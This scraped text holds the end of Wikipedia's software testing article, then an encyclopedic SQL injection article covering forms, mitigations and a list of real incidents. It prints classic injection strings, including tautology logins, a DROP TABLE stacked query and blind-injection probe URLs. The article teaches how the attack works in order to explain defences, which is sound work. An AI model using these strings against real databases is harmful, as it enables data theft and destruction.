^ Steven, John; Chandra, Pravir; Fleck, Bob; Podgurski, Andy (September 2000). "jRapture: A Capture/Replay tool for observation-based testing". ACM SIGSOFT Software Engineering Notes. 25 (5): 158–167. doi:10.1145/347636.348993. ISSN 0163-5948.

^ Saieva, Anthony; Singh, Shirish; Kaiser, Gail (September 2020). "Ad hoc Test Generation Through Binary Rewriting". 2020 IEEE 20th International Working Conference on Source Code Analysis and Manipulation (SCAM). Adelaide, Australia: IEEE: 115–126. doi:10.1109/SCAM51674.2020.00018. ISBN 978-1-7281-9248-2. S2CID 219618921.

^ Rodríguez, Ismael; Llana, Luis; Rabanal, Pablo (2014). "A General Testability Theory: Classes, properties, complexity, and testing reductions". IEEE Transactions on Software Engineering. 40 (9): 862–894. doi:10.1109/TSE.2014.2331690. ISSN 0098-5589. S2CID 6015996.

^ Rodríguez, Ismael (2009). "A General Testability Theory". CONCUR 2009 - Concurrency Theory, 20th International Conference, CONCUR 2009, Bologna, Italy, September 1–4, 2009. Proceedings. pp. 572–586. doi:10.1007/978-3-642-04081-8_38. ISBN 978-3-642-04080-1.

^ IEEE (1998). IEEE standard for software test documentation. New York: IEEE. ISBN 978-0-7381-1443-9.

^ Strom, David (July 1, 2009). "We're All Part of the Story". Software Test & Performance Collaborative. Archived from the original on August 31, 2009.

^ Griffiths, M. (2005). "Teaching agile project management to the PMI". Agile Development Conference (ADC'05). ieee.org. pp. 318–322. doi:10.1109/ADC.2005.45. ISBN 978-0-7695-2487-0. S2CID 30322339.

^ Willison, John S. (April 2004). "Agile Software Development for an Agile Force". CrossTalk. STSC (April 2004). Archived from the original on October 29, 2005.

^ An example is Mark Fewster, Dorothy Graham: Software Test Automation. Addison Wesley, 1999, ISBN 978-0-201-33140-0.

^ "stop29119". commonsensetesting.org. Archived from the original on October 2, 2014.

^ Paul Krill (August 22, 2014). "Software testers balk at ISO 29119 standards proposal". InfoWorld.

^ Kaner, Cem (2001). "NSF grant proposal to 'lay a foundation for significant improvements in the quality of academic and commercial courses in software testing'" (PDF). Archived from the original (PDF) on November 27, 2009. Retrieved October 13, 2006.

^ Kaner, Cem (2003). Measuring the Effectiveness of Software Testers (PDF). STAR East. Archived from the original (PDF) on March 26, 2010. Retrieved January 18, 2018.

^ McConnell, Steve (2004). Code Complete (2nd ed.). Microsoft Press. p. 29. ISBN 978-0-7356-1967-8.

^ Bossavit, Laurent (November 20, 2013). "The cost of defects: an illustrated history". The Leprechauns of Software Engineering: How folklore turns into fact and what to do about it. leanpub.

^ Tran, Eushiuan (1999). "Verification/Validation/Certification" (coursework). Carnegie Mellon University. Retrieved August 13, 2008.


Further reading[edit]
Meyer, Bertrand (August 2008). "Seven Principles of Software Testing" (PDF). Computer. Vol. 41, no. 8. pp. 99–101. doi:10.1109/MC.2008.306. Retrieved November 21, 2017.
External links[edit]



Wikimedia Commons has media related to Software testing.




At Wikiversity, you can learn more and teach others about Software testing at the Department of Software testing

Software testing tools and products at Curlie
"Software that makes Software better" Economist.com
vteComputer scienceNote: This template roughly follows the 2012 ACM Computing Classification System.Hardware
Printed circuit board
Peripheral
Integrated circuit
Very Large Scale Integration
Systems on Chip (SoCs)
Energy consumption (Green computing)
Electronic design automation
Hardware acceleration
Computer systems organization
Computer architecture
Embedded system
Real-time computing
Dependability
Networks
Network architecture
Network protocol
Network components
Network scheduler
Network performance evaluation
Network service
Software organization
Interpreter
Middleware
Virtual machine
Operating system
Software quality
Software notations and tools
Programming paradigm
Programming language
Compiler
Domain-specific language
Modeling language
Software framework
Integrated development environment
Software configuration management
Software library
Software repository
Software development
Control variable
Software development process
Requirements analysis
Software design
Software construction
Software deployment
Software engineering
Software maintenance
Programming team
Open-source model
Theory of computation
Model of computation
Formal language
Automata theory
Computability theory
Computational complexity theory
Logic
Semantics
Algorithms
Algorithm design
Analysis of algorithms
Algorithmic efficiency
Randomized algorithm
Computational geometry
Mathematics of computing
Discrete mathematics
Probability
Statistics
Mathematical software
Information theory
Mathematical analysis
Numerical analysis
Theoretical computer science
Information systems
Database management system
Information storage systems
Enterprise information system
Social information systems
Geographic information system
Decision support system
Process control system
Multimedia information system
Data mining
Digital library
Computing platform
Digital marketing
World Wide Web
Information retrieval
Security
Cryptography
Formal methods
Security services
Intrusion detection system
Hardware security
Network security
Information security
Application security
Human–computer interaction
Interaction design
Social computing
Ubiquitous computing
Visualization
Accessibility
Synthography
Concurrency
Concurrent computing
Parallel computing
Distributed computing
Multithreading
Multiprocessing
Artificial intelligence
Natural language processing
Knowledge representation and reasoning
Computer vision
Automated planning and scheduling
Search methodology
Control method
Philosophy of artificial intelligence
Distributed artificial intelligence
Machine learning
Supervised learning
Unsupervised learning
Reinforcement learning
Multi-task learning
Cross-validation
Graphics
Animation
Rendering
Image manipulation
Graphics processing unit
Mixed reality
Virtual reality
Image compression
Solid modeling
Applied computing
E-commerce
Enterprise software
Computational mathematics
Computational physics
Computational chemistry
Computational biology
Computational social science
Computational engineering
Computational healthcare
Digital art
Electronic publishing
Cyberwarfare
Electronic voting
Video games
Word processing
Operations research
Educational technology
Document management

 Category
 Outline
WikiProject
 Commons

vteSoftware engineeringFields
Computer programming
DevOps
Requirements engineering
Site reliability engineering
Software deployment
Software design
Software maintenance
Software testing
Systems analysis
Formal methods
Concepts
Data modeling
Enterprise architecture
Functional specification
Modeling language
Programming paradigm
Software
Software archaeology
Software architecture
Software configuration management
Software development process/methodology
Software quality
Software quality assurance
Software verification and validation
Structured analysis
Essential Analysis
CI/CD
Orientations
Agile
Aspect-oriented
Object orientation
Ontology
Service orientation
SDLC
ModelsDevelopmental
Agile
EUP
Executable UML
Incremental model
Iterative model
Prototype model
RAD
UP
Scrum
Spiral model
V-Model
Waterfall model
XP
Other
SPICE
CMMI
Data model
ER model
Function model
Information model
Metamodeling
Object model
Systems model
View model
Languages
IDEF
UML
USL
SysML
Related fields
Computer science
Computer engineering
Information science
Project management
Risk management
Systems engineering

 Commons
 Category

vteSoftware testingThe "box" approach
Black-box testing
All-pairs testing
Exploratory testing
Fuzz testing
Model-based testing
Scenario testing
Grey-box testing
White-box testing
API testing
Mutation testing
Static testing
Testing levels
Acceptance testing
Integration testing
System testing
Unit testing
Testing types, techniques,and tactics
A/B testing
Benchmark
Compatibility testing
Concolic testing
Concurrent testing
Conformance testing
Continuous testing
Destructive testing
Development testing
Dynamic program analysis
Installation testing
Regression testing
Security testing
Smoke testing (software)
Software performance testing
Symbolic execution
Test automation
Usability testing
See also
Graphical user interface testing
Manual testing
Orthogonal array testing
Pair testing
Soak testing
Software reliability testing
Stress testing
Web testing

Authority control: National libraries 
Czech Republic





Retrieved from "https://en.wikipedia.org/w/index.php?title=Software_testing&oldid=1136246390"
Categories: Software testingSoftware engineering terminologyHidden categories: Articles with short descriptionShort description is different from WikidataUse mdy dates from December 2021All accuracy disputesArticles with disputed statements from September 2014All articles with unsourced statementsArticles with unsourced statements from January 2008Articles with unsourced statements from July 2012All articles with specifically marked weasel-worded phrasesArticles with specifically marked weasel-worded phrases from August 2018All Wikipedia articles needing clarificationWikipedia articles needing clarification from August 2018Articles needing more detailed referencesArticles with unsourced statements from February 2011Articles with unsourced statements from December 2017Commons category link from WikidataArticles with Curlie linksArticles with NKC identifiers
 



From Wikipedia, the free encyclopedia


Computer hacking technique


Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
 A classification of SQL injection attacking vector as of 2010.
In computing, SQL injection is a code injection technique used  to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker).[1][2] SQL injection must exploit a security vulnerability in an application's software, for example, when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed. SQL injection is mostly known as an attack vector for websites but can be used to attack any type of SQL database.
SQL injection attacks allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server.
In a 2012 study, it was observed that the average web application received four attack campaigns per month, and retailers received twice as many attacks as other industries.[3]


History[edit]
The first public discussions of SQL injection started appearing around 1998;[4] for example, a 1998 article in Phrack Magazine.[5]

Form[edit]
SQL injection (SQLI) was considered one of the top 10 web application vulnerabilities of 2007 and 2010 by the Open Web Application Security Project.[6] In 2013, SQLI was rated the number one attack on the OWASP top ten.[7] There are four main sub-classes of SQL injection:

Classic SQLI
Blind or Inference SQL injection
Database management system-specific SQLI
Compounded SQLI
SQL injection + insufficient authentication[8]
SQL injection + DDoS attacks[9]
SQL injection + DNS hijacking[10]
SQL injection + XSS[11]
The Storm Worm is one representation of Compounded SQLI.[12]
This classification represents the state of SQLI, respecting its evolution until 2010—further refinement is underway.[13]

Technical implementations[edit]
Incorrectly constructed SQL statements[edit]
This form of injection relies on the fact that SQL statements consist of both data used by the SQL statement and commands that control how the SQL statement is executed. For example, in the SQL statement select * from person where name = 'susan' and age = 2 the string 'susan' is data and the fragment and age = 2 is an example of a command (the value 2 is also data in this example).
SQL injection occurs when specially crafted user input is processed by the receiving program in a way that allows the input to exit a data context and enter a command context. This allows the attacker to alter the structure of the SQL statement which is executed. 
As a simple example, imagine that the data 'susan' in the above statement was provided by user input. The user entered the string 'susan' (without the apostrophes) in a web form text entry field, and the program used string concatenation statements to form the above SQL statement from the three fragments select * from person where name=', the user input of 'susan', and ' and age = 2.
Now imagine that instead of entering 'susan' the attacker entered ' or 1=1; --.
The program will use the same string concatenation approach with the 3 fragments of select * from person where name=', the user input of ' or 1=1; --, and ' and age = 2 and construct the statement select * from person where name='' or 1=1; -- and age = 2. Many databases will ignore the text after the '--' string as this denotes a comment. The structure of the SQL command is now select * from person where name='' or 1=1; and this will select all person rows rather than just those named 'susan' whose age is 2. The attacker has managed to craft a data string which exits the data context and entered a command context.
A more complex example is now presented. 
Imagine a program creates a SQL statement using the following string assignment command :
var statement = "SELECT * FROM users WHERE name = '" + userName + "'";
This SQL code is designed to pull up the records of the specified username from its table of users. However, if the "userName" variable is crafted in a specific way by a malicious user, the SQL statement may do more than the code author intended. For example, setting the "userName" variable as:

' OR '1'='1
or using comments to even block the rest of the query (there are three types of SQL comments[14]). All three lines have a space at the end:

' OR '1'='1' --
' OR '1'='1' {
' OR '1'='1' /* 
renders one of the following SQL statements by the parent language:

SELECT * FROM users WHERE name = '' OR '1'='1';

SELECT * FROM users WHERE name = '' OR '1'='1' -- ';

If this code were to be used in authentication procedure then this example could be used to force the selection of every data field (*) from all users rather than from one specific user name as the coder intended,  because the evaluation of '1'='1' is always true.
The following value of "userName" in the statement below would cause the deletion of the "users" table as well as the selection of all data from the "userinfo" table (in essence revealing the information of every user), using an API that allows multiple statements:

a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't

This input renders the final SQL statement as follows and specified:

SELECT * FROM users WHERE name = 'a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't';

While most SQL server implementations allow multiple statements to be executed with one call in this way, some SQL APIs such as PHP's mysql_query() function do not allow this for security reasons. This prevents attackers from injecting entirely separate queries, but doesn't stop them from modifying queries.

Blind SQL injection[edit]
Blind SQL injection is used when a web application is vulnerable to an SQL injection but the results of the injection are not visible to the attacker. The page with the vulnerability may not be one that displays data but will display differently depending on the results of a logical statement injected into the legitimate SQL statement called for that page.
This type of attack has traditionally been considered time-intensive because a new statement needed to be crafted for each bit recovered, and depending on its structure, the attack may consist of many unsuccessful requests. Recent advancements have allowed each request to recover multiple bits, with no unsuccessful requests, allowing for more consistent and efficient extraction.[15] There are several tools that can automate these attacks once the location of the vulnerability and the target information has been established.[16]

Conditional responses[edit]
One type of blind SQL injection forces the database to evaluate a logical statement on an ordinary application screen. As an example, a book review website uses a query string to determine which book review to display. So the URL https://books.example.com/review?id=5 would cause the server to run the query

SELECT * FROM bookreviews WHERE ID = '5';

from which it would populate the review page with data from the review with ID 5, stored in the table bookreviews. The query happens completely on the server; the user does not know the names of the database, table, or fields, nor does the user know the query string. The user only sees that the above URL returns a book review. A hacker can load the URLs https://books.example.com/review?id=5 OR 1=1 and https://books.example.com/review?id=5 AND 1=2, which may result in queries

SELECT * FROM bookreviews WHERE ID = '5' OR '1'='1';
SELECT * FROM bookreviews WHERE ID = '5' AND '1'='2';

respectively. If the original review loads with the "1=1" URL and a blank or error page is returned from the "1=2" URL, and the returned page has not been created to alert the user the input is invalid, or in other words, has been caught by an input test script, the site is likely vulnerable to an SQL injection attack as the query will likely have passed through successfully in both cases. The hacker may proceed with this query string designed to reveal the version number of MySQL running on the server: https://books.example.com/review?id=5 AND substring(@@version, 1, INSTR(@@version, '.') - 1)=4, which would show the book review on a server running MySQL 4 and a blank or error page otherwise. The hacker can continue to use code within query strings to achieve their goal directly, or to glean more information from the server in hopes of discovering another avenue of attack.[17][18]

Second order SQL injection[edit]
Second order SQL injection occurs when submitted values contain malicious commands that are stored rather than executed immediately.  In some cases, the application may correctly encode an SQL statement and store it as valid SQL.  Then, another part of that application without controls to protect against SQL injection might execute that stored SQL statement.  This attack requires more knowledge of how submitted values are later used.  Automated web application security scanners would not easily detect this type of SQL injection and may need to be manually instructed where to check for evidence that it is being attempted.

Mitigation[edit]
An SQL injection is a well known attack and easily prevented by simple measures. After an apparent SQL injection attack on TalkTalk in 2015, the BBC reported that security experts were stunned that such a large company would be vulnerable to it.[19]

Object relational mappers[edit]
Developers can use ORM frameworks such as Hibernate[20] to create database queries in a safe and developer-friendly way. Since database queries are no longer constructed as strings, there is no danger of an injection vulnerability.[21]

Web application firewalls[edit]
While WAF products such as ModSecurity CRS[22] cannot prevent SQL injection vulnerabilities from creeping into a codebase, they can make discovery and exploitation significantly more challenging to an attacker.

Parameterized statements[edit]
Main article: Prepared statement
With most development platforms, parameterized statements that work with parameters can be used  (sometimes called placeholders or bind variables) instead of embedding user input in the statement. A placeholder can only store a value of the given type and not an arbitrary SQL fragment. Hence the SQL injection would simply be treated as a strange (and probably invalid) parameter value. In many cases, the SQL statement is fixed, and each parameter is a scalar, not a table. The user input is then assigned (bound) to a parameter.[23]

Enforcement at the coding level[edit]
Using object-relational mapping libraries avoids the need to write SQL code. The ORM library in effect will generate parameterized SQL statements from object-oriented code.

Escaping[edit]
A popular, though error-prone, way to prevent injections is to attempt to escape all characters that have a special meaning in SQL. The manual for an SQL DBMS explains which characters have a special meaning, which allows creating a comprehensive blacklist of characters that need translation. For instance, every occurrence of a single quote (') in a parameter must be replaced by two single quotes ('') to form a valid SQL string literal. For example, in PHP it is usual to escape parameters using the function mysqli_real_escape_string(); before sending the SQL query:

$mysqli = new mysqli('hostname', 'db_username', 'db_password', 'db_name');
$query = sprintf("SELECT * FROM `Users` WHERE UserName='%s' AND Password='%s'",
                  $mysqli->real_escape_string($username),                  $mysqli->real_escape_string($password));
$mysqli->query($query);

This function prepends backslashes to the following characters: \x00, \n, \r, \, ', " and \x1a.
This function is normally used to make data safe before sending a query to MySQL.[24] PHP has similar functions for other database systems such as pg_escape_string() for PostgreSQL. The function addslashes(string $str) works for escaping characters, and is used especially for querying on databases that do not have escaping functions in PHP.  It returns a string with backslashes before characters that need to be escaped in database queries, etc. These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).[25]
Routinely passing escaped strings to SQL is error prone because it is easy to forget to escape a given string. Creating a transparent layer to secure the input can reduce this susceptibility to error, if not entirely eliminate it.[26]

Pattern check[edit]
Integer, float or boolean, string parameters can be checked if their value is valid representation for the given type. Strings that must follow some strict pattern (date, UUID, alphanumeric only, etc.) can be checked if they match this pattern.

Database permissions[edit]
Limiting the permissions on the database login used by the web application to only what is needed may help reduce the effectiveness of any SQL injection attacks that exploit any bugs in the web application.
For example, on Microsoft SQL Server, a database logon could be restricted from selecting on some of the system tables which would limit exploits that try to insert JavaScript into all the text columns in the database.

deny select on sys.sysobjects to webdatabaselogon;
deny select on sys.objects to webdatabaselogon;
deny select on sys.tables to webdatabaselogon;
deny select on sys.views to webdatabaselogon;
deny select on sys.packages to webdatabaselogon;

Examples[edit]
In February 2002, Jeremiah Jacks discovered that Guess.com was vulnerable to an SQL injection attack, permitting anyone able to construct a properly-crafted URL to pull down 200,000+ names, credit card numbers and expiration dates in the site's customer database.[27]
On November 1, 2005, a teenaged hacker used SQL injection to break into the site of a Taiwanese information security magazine from the Tech Target group and steal customers' information.[28]
On January 13, 2006, Russian computer criminals broke into a Rhode Island government website and allegedly stole credit card data from individuals who have done business online with state agencies.[29]
On March 29, 2006, a hacker discovered an SQL injection flaw in an official Indian government's tourism site.[30]
On June 29, 2007, a computer criminal defaced the Microsoft UK website using SQL injection.[31][32] UK website The Register quoted a Microsoft spokesperson acknowledging the problem.
On September 19, 2007 and January 26, 2009 the Turkish hacker group "m0sted" used SQL injection to exploit Microsoft's SQL Server to hack web servers belonging to McAlester Army Ammunition Plant and the US Army Corps of Engineers respectively.[33]
In January 2008, tens of thousands of PCs were infected by an automated SQL injection attack that exploited a vulnerability in application code that uses Microsoft SQL Server as the database store.[34]
In July 2008, Kaspersky's Malaysian site was hacked by the "m0sted" hacker group using SQL injection.
On April 13, 2008, the Sexual and Violent Offender Registry of Oklahoma shut down its website for "routine maintenance" after being informed that 10,597 Social Security numbers belonging to sex offenders had been downloaded via an SQL injection attack[35]
In May 2008, a server farm inside China used automated queries to Google's search engine to identify SQL server websites which were vulnerable to the attack of an automated SQL injection tool.[34][36]
In 2008, at least April through August, a sweep of attacks began exploiting the SQL injection vulnerabilities of Microsoft's IIS web server and SQL Server database server. The attack does not require guessing the name of a table or column, and corrupts all text columns in all tables in a single request.[37]  A HTML string that references a malware JavaScript file is appended to each value. When that database value is later displayed to a website visitor, the script attempts several approaches at gaining control over a visitor's system. The number of exploited web pages is estimated at 500,000.[38]
On August 17, 2009, the United States Department of Justice charged an American citizen, Albert Gonzalez, and two unnamed Russians with the theft of 130 million credit card numbers using an SQL injection attack. In reportedly "the biggest case of identity theft in American history", the man stole cards from a number of corporate victims after researching their payment processing systems. Among the companies hit were credit card processor Heartland Payment Systems, convenience store chain 7-Eleven, and supermarket chain Hannaford Brothers.[39]
In December 2009, an attacker breached a RockYou plaintext database containing the unencrypted usernames and passwords of about 32 million users using an SQL injection attack.[40]
In July 2010, a South American security researcher who goes by the handle "Ch Russo" obtained sensitive user information from popular BitTorrent site The Pirate Bay. He gained access to the site's administrative control panel and exploited an SQL injection vulnerability that enabled him to collect user account information, including IP addresses, MD5 password hashes and records of which torrents individual users have uploaded.[41]
From July 24 to 26, 2010, attackers from Japan and China used an SQL injection to gain access to customers' credit card data from Neo Beat, an Osaka-based company that runs a large online supermarket site. The attack also affected seven business partners including supermarket chains Izumiya Co, Maruetsu Inc, and Ryukyu Jusco Co. The theft of data affected a reported 12,191 customers. As of August 14, 2010 it was reported that there have been more than 300 cases of credit card information being used by third parties to purchase goods and services in China.
On September 19 during the 2010 Swedish general election a voter attempted a code injection by hand writing SQL commands as part of a write-in vote.[42]
On November 8, 2010 the British Royal Navy website was compromised by a Romanian hacker named TinKode using SQL injection.[43][44]
On February 5, 2011 HBGary, a technology security firm, was broken into by LulzSec using an SQL injection in their CMS-driven website[45]
On March 27, 2011, www.mysql.com, the official homepage for MySQL, was compromised by a hacker using SQL blind injection[46]
On April 11, 2011, Barracuda Networks was compromised using an SQL injection flaw. Email addresses and usernames of employees were among the information obtained.[47]
Over a period of 4 hours on April 27, 2011, an automated SQL injection attack occurred on Broadband Reports website that was able to extract 8% of the username/password pairs: 8,000 random accounts of the 9,000 active and 90,000 old or inactive accounts.[48][49][50]
On June 1, 2011, "hacktivists" of the group LulzSec were accused of using SQLI to steal coupons, download keys, and passwords that were stored in plaintext on Sony's website, accessing the personal information of a million users.[51]
In June 2011, PBS was hacked by LulzSec, most likely through use of SQL injection; the full process used by hackers to execute SQL injections was described in this Imperva blog.[52]
In May 2012, the website for Wurm Online, a massively multiplayer online game, was shut down from an SQL injection while the site was being updated.[53]
In July 2012 a hacker group was reported to have stolen 450,000 login credentials from Yahoo!. The logins were stored in plain text and were allegedly taken from a Yahoo subdomain, Yahoo! Voices. The group breached Yahoo's security by using a "union-based SQL injection technique".[54][55]
On October 1, 2012, a hacker group called "Team GhostShell" published the personal records of students, faculty, employees, and alumni from 53 universities including Harvard, Princeton, Stanford, Cornell, Johns Hopkins, and the University of Zurich on pastebin.com. The hackers claimed that they were trying to "raise awareness towards the changes made in today's education", bemoaning changing education laws in Europe and increases in tuition in the United States.[56]
In February 2013, a group of Maldivian hackers, hacked the website "UN-Maldives" using SQL Injection.
On June 27, 2013, hacker group "RedHack" breached Istanbul Administration Site.[57]  They claimed that, they've been able to erase people's debts to water, gas, Internet, electricity, and telephone companies. Additionally, they published admin user name and password for other citizens to log in and clear their debts early morning. They announced the news from Twitter.[58]
On November 4, 2013, hacktivist group "RaptorSwag" allegedly compromised 71 Chinese government databases using an SQL injection attack on the Chinese Chamber of International Commerce. The leaked data was posted publicly in cooperation with Anonymous.[59]
On February 2, 2014, AVS TV had 40,000 accounts leaked by a hacking group called @deletesec [60]
On February 21, 2014, United Nations Internet Governance Forum had 3,215 account details leaked.[61]
On February 21, 2014, Hackers of a group called @deletesec hacked Spirol International after allegedly threatening to have the hackers arrested for reporting the security vulnerability. 70,000 user details were exposed over this conflict.[62]
On March 7, 2014, officials at Johns Hopkins University publicly announced that their Biomedical Engineering Servers had become victim to an SQL injection attack carried out by an Anonymous hacker named "Hooky" and aligned with hacktivist group "RaptorSwag". The hackers compromised personal details of 878 students and staff, posting a press release and the leaked data on the internet.[63]
In August 2014, Milwaukee-based computer security company Hold Security disclosed that it uncovered a theft of confidential information from nearly 420,000 websites through SQL injections.[64] The New York Times confirmed this finding by hiring a security expert to check the claim.[65]
In October 2015, an SQL injection attack was used to steal the personal details of 156,959 customers from British telecommunications company TalkTalk's servers, exploiting a vulnerability in a legacy web portal.[66]
In August 2020, an SQL injection attack was used to access information on the romantic interests of many Stanford students, as a result of insecure data sanitization standards on the part of Link, a start-up founded on campus by undergraduate Ishan Gandhi.[67]
In early 2021, 70 gigabytes of data was exfiltrated from the far-right website Gab through a SQL injection attack. The vulnerability was introduced into the Gab codebase by Fosco Marotto, Gab's CTO.[68] A second attack against Gab was launched the next week using OAuth2 tokens stolen during the first attack.[69]
In popular culture[edit]
A 2007 xkcd cartoon involved a character Robert'); DROP TABLE Students;-- named to carry out an SQL injection. As a result of this cartoon, SQL injection is sometimes informally referred to as "Bobby Tables".[70][71]
Unauthorized login to websites by means of SQL injection forms the basis of one of the subplots in J.K. Rowling's 2012 novel The Casual Vacancy.
In 2014, an individual in Poland legally renamed his business to Dariusz Jakubowski x'; DROP TABLE users; SELECT '1 in an attempt to disrupt operation of spammers' harvesting bots.[72]
The 2015 game Hacknet has a hacking program called SQL_MemCorrupt. It is described as injecting a table entry that causes a corruption error in an SQL database, then queries said table, causing an SQL database crash and core dump.
See also[edit]
Code injection
Cross-site scripting
Metasploit Project
OWASP Open Web Application Security Project
SGML entity
Uncontrolled format string
w3af
Web application security
References[edit]


^ Microsoft. "SQL Injection". Archived from the original on August 2, 2013. Retrieved August 4, 2013. SQL injection is an attack in which malicious code is inserted into strings that are later passed to an instance of SQL Server for parsing and execution. Any procedure that constructs SQL statements should be reviewed for injection vulnerabilities because SQLi Server will execute all syntactically valid queries that it receives. Even parameterized data can be manipulated by a skilled and determined attacker.

^ Zhuo, Z.; Cai, T.; Zhang, X.; Lv, F. (March 12, 2021). "Long short‐term memory on abstract syntax tree for SQL injection detection". IET Software. 15 (2): 188–197. doi:10.1049/sfw2.12018. ISSN 1751-8806. S2CID 233582569.

^ Imperva (July 2012). "Imperva Web Application Attack Report" (PDF). Archived (PDF) from the original on September 7, 2013. Retrieved August 4, 2013. Retailers suffer 2x as many SQL injection attacks as other industries. / While most web applications receive 4 or more web attack campaigns per month, some websites are constantly under attack. / One observed website was under attack 176 out of 180 days, or 98% of the time.

^ Sean Michael Kerner (November 25, 2013). "How Was SQL Injection Discovered? The researcher once known as Rain Forrest Puppy explains how he discovered the first SQL injection more than 15 years ago". Archived from the original on March 18, 2014.

^ Jeff Forristal (signing as rain.forest.puppy) (December 25, 1998). "NT Web Technology Vulnerabilities". Phrack Magazine. 8 (54 (article 8)). Archived from the original on March 19, 2014.

^ "Category:OWASP Top Ten Project". OWASP. Archived from the original on May 19, 2011. Retrieved June 3, 2011.

^ "Category:OWASP Top Ten Project". OWASP. Archived from the original on October 9, 2013. Retrieved August 13, 2013.

^ "WHID 2007-60: The blog of a Cambridge University security team hacked". Xiom. Archived from the original on June 19, 2011. Retrieved June 3, 2011.

^ "WHID 2009-1: Gaza conflict cyber war". Xiom. Archived from the original on October 7, 2011. Retrieved June 3, 2011.

^ "List of Web Hacking Incidents: DNS Hijacking". Xiom. Archived from the original on June 18, 2009.

^ "Third Wave of Web Attacks Not the Last". Dark Reading. Retrieved July 29, 2012.

^ Danchev, Dancho (January 23, 2007). "Mind Streams of Information Security Knowledge: Social Engineering and Malware". Ddanchev.blogspot.com. Archived from the original on July 21, 2011. Retrieved June 3, 2011.

^ Deltchev, Krassen. "New Web 2.0 Attacks". B.Sc. Thesis. Ruhr-University Bochum. Archived from the original on April 2, 2012. Retrieved February 18, 2010.

^ "How to Enter SQL Comments" (PDF), IBM Informix Guide to SQL: Syntax, IBM, pp. 13–14, retrieved June 4, 2018

^ "Extracting Multiple Bits Per Request From Full-blind SQL Injection Vulnerabilities". Hack All The Things. Archived from the original on July 8, 2016. Retrieved July 8, 2016.

^ "Using SQLBrute to brute force data from a blind SQL injection point". Justin Clarke. Archived from the original on June 14, 2008. Retrieved October 18, 2008.

^ macd3v. "Blind SQL Injection tutorial". Archived from the original on December 14, 2012. Retrieved December 6, 2012.

^ Andrey Rassokhin; Dmitry Oleksyuk. "TDSS botnet: full disclosure". Archived from the original on December 9, 2012. Retrieved December 6, 2012.

^ "Questions for TalkTalk - BBC News". BBC News. October 26, 2015. Archived from the original on October 26, 2015. Retrieved October 26, 2015.

^ "Hibernate". hibernate.org. Retrieved February 24, 2021.

^ "SQL Injection Attacks & Prevention: Complete Guide". appsecmonkey.com. February 13, 2021. Retrieved February 24, 2021.

^ "ModSecurity: Rules". modsecurity.org. Retrieved February 24, 2021.

^ "SQL Injection Prevention Cheat Sheet". Open Web Application Security Project. Archived from the original on January 20, 2012. Retrieved March 3, 2012.

^ "mysqli->real_escape_string - PHP Manual". PHP.net. Retrieved October 11, 2013.

^ "Addslashes - PHP Manual". PHP.net. Archived from the original on September 5, 2011.

^ "Transparent query layer for MySQL". Robert Eisele. November 8, 2010. Archived from the original on November 11, 2010.

^ "Guesswork Plagues Web Hole Reporting". SecurityFocus. March 6, 2002. Archived from the original on July 9, 2012.

^ "WHID 2005-46: Teen uses SQL injection to break to a security magazine web site". Web Application Security Consortium. November 1, 2005. Archived from the original on January 17, 2010. Retrieved December 1, 2009.

^ "WHID 2006-3: Russian hackers broke into a RI GOV website". Web Application Security Consortium. January 13, 2006. Archived from the original on February 13, 2011. Retrieved May 16, 2008.

^ "WHID 2006-27: SQL Injection in incredibleindia.org". Web Application Security Consortium. March 29, 2006. Archived from the original on July 1, 2009. Retrieved March 12, 2010.

^ Robert (June 29, 2007). "Hacker Defaces Microsoft U.K. Web Page". cgisecurity.net. Retrieved May 16, 2008.

^ Keith Ward (June 29, 2007). "Hacker Defaces Microsoft UK Web Page". Redmond Channel Partner Online. Archived from the original on December 23, 2007. Retrieved May 16, 2008.

^ "Anti-U.S. Hackers Infiltrate Army Servers". Information Week. May 29, 2009. Archived from the original on December 20, 2016. Retrieved December 17, 2016.

^ a b Sumner Lemon, IDG News Service (May 19, 2008). "Mass SQL Injection Attack Targets Chinese Web Sites". PCWorld. Retrieved May 27, 2008.[permanent dead link]

^ Alex Papadimoulis (April 15, 2008). "Oklahoma Leaks Tens of Thousands of Social Security Numbers, Other Sensitive Data". The Daily WTF. Archived from the original on May 10, 2008. Retrieved May 16, 2008.

^ Michael Zino (May 1, 2008). "ASCII Encoded/Binary String Automated SQL Injection Attack". Archived from the original on June 1, 2008.

^ Giorgio Maone (April 26, 2008). "Mass Attack FAQ". Archived from the original on September 14, 2008.

^ Gregg Keizer (April 25, 2008). "Huge Web hack attack infects 500,000 pages". Archived from the original on October 19, 2015. Retrieved October 16, 2015.

^ "US man 'stole 130m card numbers'". BBC. August 17, 2009. Archived from the original on August 18, 2009. Retrieved August 17, 2009.

^ O'Dell, Jolie (December 16, 2009). "RockYou Hacker - 30% of Sites Store Plain Text Passwords". New York Times. Retrieved May 23, 2010.

^ "The pirate bay attack". July 7, 2010. Archived from the original on August 24, 2010.
